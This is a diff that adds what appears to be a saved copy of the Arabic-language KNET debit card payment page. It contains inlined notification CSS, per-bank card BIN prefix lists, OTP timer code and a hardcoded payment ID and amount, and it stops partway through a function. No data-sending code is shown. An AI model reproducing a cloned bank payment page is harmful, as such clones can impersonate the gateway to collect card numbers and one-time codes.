@@ -1,0 +1,2601 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <meta http-equiv="CACHE-CONTROL" content="max-age=0">
+    <meta charset="utf-8">
+    <title>KNET Payments</title>
+    <!-- commented for jquery vulnerability fix -->
+    <!-- Added for jquery vulnerability fix -->
+    <script src="./js/jquery-3.5.1.js"></script>
+    <style>
+    undefined
+    </style>
+    <style type="text/css">
+    @keyframes spin-668344b5 {
+        0% {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(1turn)
+        }
+    }
+    </style>
+    <style type="text/css">
+    :root {
+        --toastify-color-light: #fff;
+        --toastify-color-dark: #121212;
+        --toastify-color-info: #3498db;
+        --toastify-color-success: #07bc0c;
+        --toastify-color-warning: #f1c40f;
+        --toastify-color-error: #e74c3c;
+        --toastify-color-transparent: #ffffffb3;
+        --toastify-icon-color-info: var(--toastify-color-info);
+        --toastify-icon-color-success: var(--toastify-color-success);
+        --toastify-icon-color-warning: var(--toastify-color-warning);
+        --toastify-icon-color-error: var(--toastify-color-error);
+        --toastify-toast-width: 320px;
+        --toastify-toast-background: #fff;
+        --toastify-toast-min-height: 64px;
+        --toastify-toast-max-height: 800px;
+        --toastify-font-family: sans-serif;
+        --toastify-z-index: 9999;
+        --toastify-text-color-light: #757575;
+        --toastify-text-color-dark: #fff;
+        --toastify-text-color-info: #fff;
+        --toastify-text-color-success: #fff;
+        --toastify-text-color-warning: #fff;
+        --toastify-text-color-error: #fff;
+        --toastify-spinner-color: #616161;
+        --toastify-spinner-color-empty-area: #e0e0e0;
+        --toastify-color-progress-light: linear-gradient(90deg, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55);
+        --toastify-color-progress-dark: #bb86fc;
+        --toastify-color-progress-info: var(--toastify-color-info);
+        --toastify-color-progress-success: var(--toastify-color-success);
+        --toastify-color-progress-warning: var(--toastify-color-warning);
+        --toastify-color-progress-error: var(--toastify-color-error);
+        --toastify-color-progress-colored: #ddd
+    }
+
+    .Toastify__toast-container {
+        box-sizing: border-box;
+        color: #fff;
+        padding: 4px;
+        position: fixed;
+        transform: translate3d(0, 0, var(--toastify-z-index) px);
+        width: var(--toastify-toast-width);
+        z-index: var(--toastify-z-index)
+    }
+
+    .Toastify__toast-container--top-left {
+        left: 1em;
+        top: 1em
+    }
+
+    .Toastify__toast-container--top-center {
+        left: 50%;
+        top: 1em;
+        transform: translateX(-50%)
+    }
+
+    .Toastify__toast-container--top-right {
+        right: 1em;
+        top: 1em
+    }
+
+    .Toastify__toast-container--bottom-left {
+        bottom: 1em;
+        left: 1em
+    }
+
+    .Toastify__toast-container--bottom-center {
+        bottom: 1em;
+        left: 50%;
+        transform: translateX(-50%)
+    }
+
+    .Toastify__toast-container--bottom-right {
+        bottom: 1em;
+        right: 1em
+    }
+
+    @media only screen and (max-width:480px) {
+        .Toastify__toast-container {
+            left: 0;
+            margin: 0;
+            padding: 0;
+            width: 100vw
+        }
+
+        .Toastify__toast-container--top-center,
+        .Toastify__toast-container--top-left,
+        .Toastify__toast-container--top-right {
+            top: 0;
+            transform: translateX(0)
+        }
+
+        .Toastify__toast-container--bottom-center,
+        .Toastify__toast-container--bottom-left,
+        .Toastify__toast-container--bottom-right {
+            bottom: 0;
+            transform: translateX(0)
+        }
+
+        .Toastify__toast-container--rtl {
+            left: auto;
+            right: 0
+        }
+    }
+
+    .Toastify__toast {
+        border-radius: 4px;
+        box-shadow: 0 1px 10px 0 #0000001a, 0 2px 15px 0 #0000000d;
+        box-sizing: border-box;
+        cursor: pointer;
+        direction: ltr;
+        display: flex;
+        font-family: var(--toastify-font-family);
+        justify-content: space-between;
+        margin-bottom: 1rem;
+        max-height: var(--toastify-toast-max-height);
+        min-height: var(--toastify-toast-min-height);
+        overflow: hidden;
+        padding: 8px;
+        position: relative;
+        z-index: 0
+    }
+
+    .Toastify__toast--rtl {
+        direction: rtl
+    }
+
+    .Toastify__toast-body {
+        align-items: center;
+        display: flex;
+        flex: 1 1 auto;
+        margin: auto 0;
+        padding: 6px;
+        white-space: pre-wrap
+    }
+
+    .Toastify__toast-body>div:last-child {
+        flex: 1
+    }
+
+    .Toastify__toast-icon {
+        display: flex;
+        flex-shrink: 0;
+        margin-inline-end: 10px;
+        width: 20px
+    }
+
+    .Toastify--animate {
+        animation-duration: .7s;
+        animation-fill-mode: both
+    }
+
+    .Toastify--animate-icon {
+        animation-duration: .3s;
+        animation-fill-mode: both
+    }
+
+    @media only screen and (max-width:480px) {
+        .Toastify__toast {
+            border-radius: 0;
+            margin-bottom: 0
+        }
+    }
+
+    .Toastify__toast-theme--dark {
+        background: var(--toastify-color-dark);
+        color: var(--toastify-text-color-dark)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--default,
+    .Toastify__toast-theme--light {
+        background: var(--toastify-color-light);
+        color: var(--toastify-text-color-light)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--info {
+        background: var(--toastify-color-info);
+        color: var(--toastify-text-color-info)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--success {
+        background: var(--toastify-color-success);
+        color: var(--toastify-text-color-success)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--warning {
+        background: var(--toastify-color-warning);
+        color: var(--toastify-text-color-warning)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--error {
+        background: var(--toastify-color-error);
+        color: var(--toastify-text-color-error)
+    }
+
+    .Toastify__progress-bar-theme--light {
+        background: var(--toastify-color-progress-light)
+    }
+
+    .Toastify__progress-bar-theme--dark {
+        background: var(--toastify-color-progress-dark)
+    }
+
+    .Toastify__progress-bar--info {
+        background: var(--toastify-color-progress-info)
+    }
+
+    .Toastify__progress-bar--success {
+        background: var(--toastify-color-progress-success)
+    }
+
+    .Toastify__progress-bar--warning {
+        background: var(--toastify-color-progress-warning)
+    }
+
+    .Toastify__progress-bar--error {
+        background: var(--toastify-color-progress-error)
+    }
+
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--default {
+        background: var(--toastify-color-progress-colored)
+    }
+
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--error,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--info,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--success,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--warning {
+        background: var(--toastify-color-transparent)
+    }
+
+    .Toastify__close-button {
+        align-self: flex-start;
+        background: #0000;
+        border: none;
+        color: #fff;
+        cursor: pointer;
+        opacity: .7;
+        outline: none;
+        padding: 0;
+        transition: .3s ease
+    }
+
+    .Toastify__close-button--light {
+        color: #000;
+        opacity: .3
+    }
+
+    .Toastify__close-button>svg {
+        fill: currentcolor;
+        height: 16px;
+        width: 14px
+    }
+
+    .Toastify__close-button:focus,
+    .Toastify__close-button:hover {
+        opacity: 1
+    }
+
+    @keyframes Toastify__trackProgress {
+        0% {
+            transform: scaleX(1)
+        }
+
+        to {
+            transform: scaleX(0)
+        }
+    }
+
+    .Toastify__progress-bar {
+        bottom: 0;
+        height: 5px;
+        left: 0;
+        opacity: .7;
+        position: absolute;
+        transform-origin: left;
+        width: 100%;
+        z-index: var(--toastify-z-index)
+    }
+
+    .Toastify__progress-bar--animated {
+        animation: Toastify__trackProgress linear 1 forwards
+    }
+
+    .Toastify__progress-bar--controlled {
+        transition: transform .2s
+    }
+
+    .Toastify__progress-bar--rtl {
+        left: auto;
+        right: 0;
+        transform-origin: right
+    }
+
+    .Toastify__spinner {
+        animation: Toastify__spin .65s linear infinite;
+        border: 2px solid;
+        border-color: var(--toastify-spinner-color-empty-area);
+        border-radius: 100%;
+        border-right-color: var(--toastify-spinner-color);
+        box-sizing: border-box;
+        height: 20px;
+        width: 20px
+    }
+
+    @keyframes Toastify__bounceInRight {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(3000px, 0, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(-25px, 0, 0)
+        }
+
+        75% {
+            transform: translate3d(10px, 0, 0)
+        }
+
+        90% {
+            transform: translate3d(-5px, 0, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutRight {
+        20% {
+            opacity: 1;
+            transform: translate3d(-20px, 0, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(2000px, 0, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInLeft {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(-3000px, 0, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(25px, 0, 0)
+        }
+
+        75% {
+            transform: translate3d(-10px, 0, 0)
+        }
+
+        90% {
+            transform: translate3d(5px, 0, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutLeft {
+        20% {
+            opacity: 1;
+            transform: translate3d(20px, 0, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(-2000px, 0, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInUp {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(0, 3000px, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(0, -20px, 0)
+        }
+
+        75% {
+            transform: translate3d(0, 10px, 0)
+        }
+
+        90% {
+            transform: translate3d(0, -5px, 0)
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__bounceOutUp {
+        20% {
+            transform: translate3d(0, -10px, 0)
+        }
+
+        40%,
+        45% {
+            opacity: 1;
+            transform: translate3d(0, 20px, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(0, -2000px, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInDown {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(0, -3000px, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(0, 25px, 0)
+        }
+
+        75% {
+            transform: translate3d(0, -10px, 0)
+        }
+
+        90% {
+            transform: translate3d(0, 5px, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutDown {
+        20% {
+            transform: translate3d(0, 10px, 0)
+        }
+
+        40%,
+        45% {
+            opacity: 1;
+            transform: translate3d(0, -20px, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(0, 2000px, 0)
+        }
+    }
+
+    .Toastify__bounce-enter--bottom-left,
+    .Toastify__bounce-enter--top-left {
+        animation-name: Toastify__bounceInLeft
+    }
+
+    .Toastify__bounce-enter--bottom-right,
+    .Toastify__bounce-enter--top-right {
+        animation-name: Toastify__bounceInRight
+    }
+
+    .Toastify__bounce-enter--top-center {
+        animation-name: Toastify__bounceInDown
+    }
+
+    .Toastify__bounce-enter--bottom-center {
+        animation-name: Toastify__bounceInUp
+    }
+
+    .Toastify__bounce-exit--bottom-left,
+    .Toastify__bounce-exit--top-left {
+        animation-name: Toastify__bounceOutLeft
+    }
+
+    .Toastify__bounce-exit--bottom-right,
+    .Toastify__bounce-exit--top-right {
+        animation-name: Toastify__bounceOutRight
+    }
+
+    .Toastify__bounce-exit--top-center {
+        animation-name: Toastify__bounceOutUp
+    }
+
+    .Toastify__bounce-exit--bottom-center {
+        animation-name: Toastify__bounceOutDown
+    }
+
+    @keyframes Toastify__none {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-duration: 0;
+            animation-timing-function: none
+        }
+
+        0% {
+            opacity: 1;
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    .Toastify__none-enter--bottom-center,
+    .Toastify__none-enter--bottom-left,
+    .Toastify__none-enter--bottom-right,
+    .Toastify__none-enter--top-center,
+    .Toastify__none-enter--top-left,
+    .Toastify__none-enter--top-right {
+        animation-name: Toastify__none
+    }
+
+    @keyframes Toastify__zoomIn {
+        0% {
+            opacity: 0;
+            transform: scale3d(.3, .3, .3)
+        }
+
+        50% {
+            opacity: 1
+        }
+    }
+
+    @keyframes Toastify__zoomOut {
+        0% {
+            opacity: 1
+        }
+
+        50% {
+            opacity: 0;
+            transform: scale3d(.3, .3, .3)
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+
+    .Toastify__zoom-enter {
+        animation-name: Toastify__zoomIn
+    }
+
+    .Toastify__zoom-exit {
+        animation-name: Toastify__zoomOut
+    }
+
+    @keyframes Toastify__flipIn {
+        0% {
+            animation-timing-function: ease-in;
+            opacity: 0;
+            transform: perspective(400px) rotateX(90deg)
+        }
+
+        40% {
+            animation-timing-function: ease-in;
+            transform: perspective(400px) rotateX(-20deg)
+        }
+
+        60% {
+            opacity: 1;
+            transform: perspective(400px) rotateX(10deg)
+        }
+
+        80% {
+            transform: perspective(400px) rotateX(-5deg)
+        }
+
+        to {
+            transform: perspective(400px)
+        }
+    }
+
+    @keyframes Toastify__flipOut {
+        0% {
+            transform: perspective(400px)
+        }
+
+        30% {
+            opacity: 1;
+            transform: perspective(400px) rotateX(-20deg)
+        }
+
+        to {
+            opacity: 0;
+            transform: perspective(400px) rotateX(90deg)
+        }
+    }
+
+    .Toastify__flip-enter {
+        animation-name: Toastify__flipIn
+    }
+
+    .Toastify__flip-exit {
+        animation-name: Toastify__flipOut
+    }
+
+    @keyframes Toastify__slideInRight {
+        0% {
+            transform: translate3d(110%, 0, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInLeft {
+        0% {
+            transform: translate3d(-110%, 0, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInUp {
+        0% {
+            transform: translate3d(0, 110%, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInDown {
+        0% {
+            transform: translate3d(0, -110%, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideOutRight {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(110%, 0, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutLeft {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(-110%, 0, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutDown {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(0, 500px, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutUp {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(0, -500px, 0);
+            visibility: hidden
+        }
+    }
+
+    .Toastify__slide-enter--bottom-left,
+    .Toastify__slide-enter--top-left {
+        animation-name: Toastify__slideInLeft
+    }
+
+    .Toastify__slide-enter--bottom-right,
+    .Toastify__slide-enter--top-right {
+        animation-name: Toastify__slideInRight
+    }
+
+    .Toastify__slide-enter--top-center {
+        animation-name: Toastify__slideInDown
+    }
+
+    .Toastify__slide-enter--bottom-center {
+        animation-name: Toastify__slideInUp
+    }
+
+    .Toastify__slide-exit--bottom-left,
+    .Toastify__slide-exit--top-left {
+        animation-name: Toastify__slideOutLeft
+    }
+
+    .Toastify__slide-exit--bottom-right,
+    .Toastify__slide-exit--top-right {
+        animation-name: Toastify__slideOutRight
+    }
+
+    .Toastify__slide-exit--top-center {
+        animation-name: Toastify__slideOutUp
+    }
+
+    .Toastify__slide-exit--bottom-center {
+        animation-name: Toastify__slideOutDown
+    }
+
+    @keyframes Toastify__spin {
+        0% {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(1turn)
+        }
+    }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa">
+    <style id="qr-scanner-styles">
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    </style>
+</head>
+
+<body>
+    <link href="./css/payment-stylesheet.css?ver=1.70" rel="stylesheet" type="text/css">
+    <link href="./css/payment-responsive-ar.css?ver=1.70" rel="stylesheet" type="text/css">
+    <script type="text/javascript" src="./js/checkSum.js"></script>
+    <script language="JavaScript" src="./js/AuthValidation.js"></script>
+    <script type="text/javascript">
+    //Added for OTP at I-T-B level
+    var termBrandlvlAmt;
+
+    /*code added for redirect-starts*/
+    function callTimeOutForbackBotton() {
+        window.location.hash = window.location.hash[window.location.hash.length - 1];
+        setTimeout('callTimeOutForbackBotton()', 10);
+    }
+    /*code added for redirect-ends*/
+
+    var keys;
+    /*Added for OTP at I-T-B level*/
+    var amountlimit;
+    var OTPamtlmtIdentifier;
+    //Added for QA fix
+    var otpTimer;
+    var timer;
+    var timer2;
+    //Added for brand changes
+    var brdtype;
+    var configbrdtype = 'Eidia';
+    var configexpdate = '12';
+    var configexpyear = '2022';
+
+    //Added for PG Eidia Discount
+    var instPgEiddiscntflg = '1';
+    var termPgEiddiscntflg = '0';
+    var pymtPgEiddiscntflg = '0';
+    // Modified for 8 digit bin mandate changes
+    var cardLength;
+
+
+    function selectPayInstr(val) {
+
+        document.paypage.creditDebitCheck.value = val;
+        document.paypage.selectedPymntInstrmnt.value = val;
+        document.paypage.otherCards.value = val;
+
+        if (true) {
+            document.getElementById('creditCaptchaMsg').style.display = 'none';
+            if (false)
+                document.getElementById('creditRadioCaptchaMsg').style.display = 'none';
+        }
+        if (true) {
+            document.getElementById('debitCaptchaMsg').style.display = 'none';
+            if (false)
+                document.getElementById('debitRadioCaptchaMsg').style.display = 'none';
+        }
+        if (false) {
+            document.getElementById('ddCaptchaMsg').style.display = 'none';
+        }
+        if (false) {
+            document.getElementById('impsCaptchaMsg').style.display = 'none';
+        }
+        if (false) {
+            document.getElementById('prepaidCaptchaMsg').style.display = 'none';
+            if (false)
+                document.getElementById('prepaidRadioCaptchaMsg').style.display = 'none';
+        }
+        if (false && false) {
+            document.getElementById('pzCaptchaMsg').style.display = 'none';
+        }
+
+        //Added for One Click Checkout
+        if (val == 'SVC') {
+            document.getElementById('savedRadioCaptchaMsg').style.display = 'none';
+            document.paypage.fcExpCheck.value = "fcExpDate";
+            $("#checkFC").hide();
+        } else {
+            document.paypage.fcExpCheck.value = "";
+        }
+        //Added for One Click Checkout
+
+    }
+
+    function validateprefixid(val) {
+        var index = document.getElementById("dcprefix").selectedIndex;
+        var binLength = document.getElementById("dcprefix").options[index].text.length;
+        // Modified for 8 digit bin mandate changes- starts
+        var cardL = cardLength[index];
+
+        if (cardL != null && cardL != "" && cardL == 19) {
+            if (binLength == 9) {
+                document.getElementById("debitNumber").maxLength = "10";
+                document.getElementById("debitNumber").size = "10";
+                document.getElementById("debitNumber").title = "Should be in number. Length should be 10";
+            } else if (binLength == 8) {
+                document.getElementById("debitNumber").maxLength = "11";
+                document.getElementById("debitNumber").size = "11";
+                document.getElementById("debitNumber").title = "Should be in number. Length should be 11";
+            } else if (binLength == 7) {
+                document.getElementById("debitNumber").maxLength = "12";
+                document.getElementById("debitNumber").size = "12";
+                document.getElementById("debitNumber").title = "Should be in number. Length should be 12";
+            } else if (binLength == 6) {
+                document.getElementById("debitNumber").maxLength = "13";
+                document.getElementById("debitNumber").size = "13";
+                document.getElementById("debitNumber").title = "Should be in number. Length should be 13";
+            }
+        } else {
+            if (binLength == 9) {
+                document.getElementById("debitNumber").maxLength = "7";
+                document.getElementById("debitNumber").size = "7";
+                document.getElementById("debitNumber").title = "&#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1601;&#1610; &#1575;&#1604;&#1593;&#1583;&#1583;. &#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1575;&#1604;&#1591;&#1608;&#1604; 7";
+            } else if (binLength == 8) {
+                document.getElementById("debitNumber").maxLength = "8";
+                document.getElementById("debitNumber").size = "8";
+                document.getElementById("debitNumber").title = "&#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1601;&#1610; &#1575;&#1604;&#1593;&#1583;&#1583;. &#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1575;&#1604;&#1591;&#1608;&#1604; 8";
+            } else if (binLength == 7) {
+                document.getElementById("debitNumber").maxLength = "9";
+                document.getElementById("debitNumber").size = "9";
+                document.getElementById("debitNumber").title = "&#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1601;&#1610; &#1575;&#1604;&#1593;&#1583;&#1583;. &#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1575;&#1604;&#1591;&#1608;&#1604; 9";
+            } else if (binLength == 6) {
+                document.getElementById("debitNumber").maxLength = "10";
+                document.getElementById("debitNumber").size = "10";
+                document.getElementById("debitNumber").title = "&#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1601;&#1610; &#1575;&#1604;&#1593;&#1583;&#1583;. &#1610;&#1580;&#1576; &#1571;&#1606; &#1610;&#1603;&#1608;&#1606; &#1575;&#1604;&#1591;&#1608;&#1604; 10";
+            }
+        }
+    }
+
+    function ValidateNumPin(evt) {
+        var charCode = (evt.which) ? evt.which : event.keyCode
+        if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)) { // Check if its only Numeric
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    /**
+    function isOtpNumeric(evt){ 
+        var charCode = (evt.which) ? evt.which : event.keyCode
+        if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)){ // Check if its only Numeric
+            return false;
+        }
+        else{
+            return true;
+        }
+    }
+    **/
+
+    function isOtpNumeric(event) {
+        const input = event.target;
+        const value = input.value.trim();
+
+        if (!value.match(/^\d*$/)) {
+            input.value = value.replace(/[^\d]/g, '');
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    function validatebank(val) {
+        if (val == "ABK") {
+            $("#dcprefix").html("<option value='403622'>403622</option><option value='423826'>423826</option><option value='428628'>428628</option>");
+        } else if (val == "ALRAJHI") {
+            $("#dcprefix").html("<option value='458838'>458838</option>");
+        } else if (val == "BBK") {
+            $("#dcprefix").html("<option value='588790'>588790</option><option value='418056'>418056</option>");
+        } else if (val == "BOUBYAN") {
+            $("#dcprefix").html("<option value='470350'>470350</option><option value='490455'>490455</option><option value='490456'>490456</option><option value='404919'>404919</option><option value='490456'>490456</option><option value='450605'>450605</option><option value='426058'>426058</option><option value='431199'>431199</option>");
+        } else if (val == "BURGAN") {
+            $("#dcprefix").html("<option value='49219000'>49219000</option><option value='415254'>415254</option><option value='450238'>450238</option><option value='468564'>468564</option><option value='540759'>540759</option><option value='402978'>402978</option><option value='403583'>403583</option>");
+        } else if (val == "CBK") {
+            $("#dcprefix").html("<option value='532672'>532672</option><option value='537015'>537015</option><option value='521175'>521175</option><option value='516334'>516334</option>");
+        } else if (val == "DOHA") {
+            $("#dcprefix").html("<option value='419252'>419252</option>");
+        } else if (val == "GBK") {
+            $("#dcprefix").html("<option value='531644'>531644</option><option value='517419'>517419</option><option value='531471'>531471</option><option value='559475'>559475</option><option value='517458'>517458</option><option value='526206'>526206</option><option value='531329'>531329</option><option value='531470'>531470</option>");
+        } else if (val == "TAM") {
+            $("#dcprefix").html("<option value='45077848'>45077848</option><option value='45077849'>45077849</option>");
+        } else if (val == "KFH") {
+            $("#dcprefix").html("<option value='450778'>450778</option><option value='537016'>537016</option><option value='532674'>532674</option><option value='485602'>485602</option>");
+        } else if (val == "KIB") {
+            $("#dcprefix").html("<option value='406464'>406464</option><option value='409054'>409054</option>");
+        } else if (val == "NBK") {
+            $("#dcprefix").html("<option value='464452'>464452</option><option value='589160'>589160</option>");
+        } else if (val == "WEYAY") {
+            $("#dcprefix").html("<option value='464425250'>464425250</option><option value='543363'>543363</option>");
+        } else if (val == "QNB") {
+            $("#dcprefix").html("<option value='524745'>524745</option><option value='521020'>521020</option>");
+        } else if (val == "UNB") {
+            $("#dcprefix").html("<option value='457778'>457778</option>");
+        } else if (val == "WARBA") {
+            $("#dcprefix").html("<option value='532749'>532749</option><option value='559459'>559459</option><option value='541350'>541350</option><option value='525528'>525528</option>");
+        } else {
+            $("#dcprefix").html("<option value=''>بادئة</option>")
+        }
+
+    }
+
+
+    function setdebitMonth(val) {
+        document.paypage.debitMonth.value = val;
+    }
+
+    function setdebitYear(val) {
+        document.paypage.debitYear.value = val;
+    }
+
+    function OndeleteDetails(cardNumHashTx) {
+
+        if (document.getElementById("debitsavedcardPIN")) {
+            document.getElementById("debitsavedcardPIN").value = "";
+        }
+
+        var paymentId = "60102700006594106019560000720410";
+        var payid = document.paypage.paymentId.value;
+        document.paypage.cardnohash.value = cardNumHashTx;
+        document.paypage.deletecard.value = 1;
+        document.paypage.action = "/kpg/paymentpageqcdereg.htm?PaymentID=" + payid;
+        document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+        document.paypage.submit();
+
+    }
+
+    //Added for PG Eidia Discount
+    function forEidDiscntfn(Discntval, tranamtDiscntVal) {
+        Discntval = Discntval.toFixed(2);
+        tranamtDiscntVal = tranamtDiscntVal.toFixed(3);
+        document.paypage.discountval.value = Discntval;
+        document.paypage.discountedtranamount.value = tranamtDiscntVal;
+
+        if (Discntval != "0.00") {
+            document.getElementById('OrgTranxAmt').innerHTML = '<div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;font-style: italic;" ><s>KD&nbsp;6.000</s></label></div><div  style="float:right;"><label class="column-label" style="width:auto;"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</label></div>';
+            document.getElementById('DiscntRate').innerHTML = '<div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;color: #228B22;" >' + document.paypage.discountval.value + '&nbsp;<span>%</span></label></div><div  style="float:right;"><label class="column-label" style="width:auto;color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</label></div>';
+            document.getElementById('DiscntedAmt').innerHTML = '<div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;">KD&nbsp;' + document.paypage.discountedtranamount.value + '</label></div><div  style="float:right;"><label class="column-label" style="width:auto;"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</label></div>';
+            $("#DiscntRate").show();
+            $("#DiscntedAmt").show();
+            $("#OrgTranxAmt").addClass("row");
+        } else {
+            document.getElementById('OrgTranxAmt').innerHTML = '<div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;">KD&nbsp;6.000</label></div><div  style="float:right;"><label class="column-label" style="width:auto;"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</label></div>';
+            document.getElementById('DiscntRate').innerHTML = '';
+            document.getElementById('DiscntedAmt').innerHTML = '';
+            $("#DiscntRate").hide();
+            $("#DiscntedAmt").hide();
+            $("#OrgTranxAmt").removeClass("row");
+        }
+    }
+    //Added for PG Eidia Discount
+
+    //Added for Points Redemption - modified    
+    //function timer(){
+    function timer(val) {
+        timer = val * 60;
+
+        function countDown() {
+
+            if (--timer) {
+                var minutes = timer % 60;
+                if (!minutes) {
+                    minutes = '00';
+                }
+
+                $("#debitOTPtimer").attr("placeholder", "Timeout in: " + Math.floor(timer / 60) + ':' + minutes);
+                timer2 = setTimeout(countDown, 1000);
+            } else {
+                $("#debitOTPtimer").hide();
+                $("#debitOTPtimer1").show();
+                document.paypage.timeOver.value = 1;
+            }
+
+        }
+        countDown();
+    }
+
+    //Added fo QA issue fix
+    function resetTimer(val) {
+        var timer1 = val * 60;
+
+        function countDown() {
+            if (--timer1) {
+
+                var minutes = timer1 % 60;
+                if (!minutes) {
+                    minutes = '00';
+                }
+
+                clearTimeout(timer2);
+                $("#debitOTPtimer").attr("placeholder", "Timeout in: " + Math.floor(timer1 / 60) + ':' + minutes);
+                document.paypage.timeOver.value = 0;
+                timer2 = setTimeout(countDown, 1000);
+            } else {
+                $("#debitOTPtimer").hide();
+                $("#debitOTPtimer1").show();
+                document.paypage.timeOver.value = 1;
+            }
+        }
+        countDown();
+    }
+
+    function paymentOptionChange(name) {
+        if (name == 'DC') {
+
+            document.getElementById("paypage").reset();
+            document.getElementById("paymentOptionDC").checked = true;
+            document.getElementById('FCUseDebitEnable').style.display = "block";
+            document.getElementById('savedCardDiv').style.display = "none";
+            $('#checkFC').show();
+            $('#siflg').show();
+            $("#debitCaptchaMsg").hide();
+            $("#ValidationMessage").hide();
+            document.paypage.creditDebitCheck.value = "";
+            //Added for PG Eidia Discount
